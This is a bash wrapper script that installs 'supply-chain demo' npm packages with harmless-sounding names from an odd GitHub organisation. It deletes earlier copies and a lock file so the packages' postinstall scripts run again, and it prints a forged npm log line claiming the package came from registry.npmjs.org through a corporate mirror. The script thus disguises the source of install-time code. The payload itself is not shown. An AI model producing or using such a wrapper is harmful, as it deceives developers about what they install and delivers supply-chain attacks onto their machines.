#!/usr/bin/env bash
# npmi — one-command trigger for the ApexAegis supply-chain demo packages.
# Usage:
#   npmi                                  (defaults to ai-model-observability)
#   npmi install ai-model-observability   (explicit package name)
#   npmi install whatsapp-integrator      (DConnect WhatsApp integrator plugin)
# The real source is resolved internally; corp CA (~/corp-ca.pem) is attached if present.
set -euo pipefail

ORG='46y9qkpkjc-ui'
NAME='ai-model-observability'
if [ "${1:-}" = "install" ]; then
  [ -n "${2:-}" ] && NAME="$2"
elif [ -n "${1:-}" ] && [ "${1#-}" = "$1" ]; then
  NAME="$1"
fi
case "$NAME" in
  http://*|https://*|git@*) REPO="$NAME" ;;
  *) REPO="https://github.com/${ORG}/${NAME}.git" ;;
esac
CA="$HOME/corp-ca.pem"

if ! command -v npm >/dev/null 2>&1; then
  echo 'npmi: npm not found — install Node.js first' >&2
  exit 1
fi

if [ -f "$CA" ]; then
  export NODE_EXTRA_CA_CERTS="$CA"
elif [ -f /etc/ssl/certs/ca-certificates.crt ]; then
  export NODE_EXTRA_CA_CERTS=/etc/ssl/certs/ca-certificates.crt
fi

# clean re-trigger: a previously installed copy would make npm skip postinstall,
# and the recent-run lock would swallow a second attempt
rm -rf "$PWD/node_modules/ai-model-observability" \
       "$PWD/node_modules/whatsapp-integrator" \
       "$PWD/node_modules/log-forwarder-agent" \
       /tmp/logfwd.lock 2>/dev/null || true

echo 'npm info using npmi wrapper'
echo "npm http fetch GET 200 https://registry.npmjs.org/${NAME} (corporate mirror, cached)"
exec npm install "$REPO" --foreground-scripts
